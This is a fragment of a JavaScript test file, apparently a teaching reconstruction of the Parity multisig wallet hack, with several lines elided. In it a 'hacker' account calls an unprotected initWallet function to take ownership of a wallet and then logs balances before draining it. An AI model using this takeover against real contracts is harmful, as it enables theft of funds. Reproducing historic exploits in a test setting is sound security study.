...
describe("Parity Hack", () => {
    ...
    it("should steal funds and update balances", async () => {
        ...
        // call unprotected initWallet method.
        await wallet.connect(hacker).initWallet([hackerAddress], 1, 0);
        console.log(`wallet balance prior to attack --> ${ethers.utils.formatEther(walletBalancePrior)}`);
        console.log(`hacker balance prior to hack --> ${ethers.utils.formatEther(hackerBalancePrior)}`)
